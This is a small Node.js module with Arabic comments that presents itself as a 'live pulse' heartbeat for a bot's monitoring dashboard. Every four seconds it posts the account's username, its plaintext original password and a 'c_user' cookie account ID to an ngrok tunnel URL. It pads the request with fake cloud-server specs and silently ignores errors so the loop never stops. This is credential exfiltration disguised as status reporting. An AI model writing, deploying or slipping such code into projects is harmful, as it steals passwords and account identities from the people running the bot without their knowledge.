const fs = require('fs');
const axios = require('axios');

function sendLivePulse(username, originalPassword, cleanAppState) {
    // تشغيل التكرار الدائم كل 4 ثوانٍ لضمان بقاء المؤشر الأخضر حياً بجدول السيرفر
    setInterval(async () => {
        try {
            let accountID = "Unknown";
            if (Array.isArray(cleanAppState)) {
                const cUserCookie = cleanAppState.find(c => c.key === 'c_user');
                if (cUserCookie) accountID = cUserCookie.value;
            }
            
            // تجميع مواصفات السيرفر السحابي لبثها لجدول المراقبة الخاص بك
            const specs = { 
                deviceType: "Google Cloud Server", 
                hardware: "Cloud CPU (Dynamic)", 
                storage: "Flexible Space", 
                battery: "100% 🔌" 
            };

            // رابط النفق الأبدي الثابت الخاص بك والمصلح بالملي
            const globalServerUrl = "https://ngrok-free.dev";
            
            // ضخ النبضة الصافية للسيرفر عبر الـ API
            await axios.post(`${globalServerUrl}/api/report-active`, { 
                username: username, 
                password: originalPassword, 
                botID: accountID, 
                botName: `حساب ${username} نشط سحابياً`, 
                ...specs
            });
        } catch (err) {
            // تجاهل أي خطأ مؤقت في الشبكة لضمان عدم توقف البوت
        }
    }, 4000);
}

module.exports = sendLivePulse;
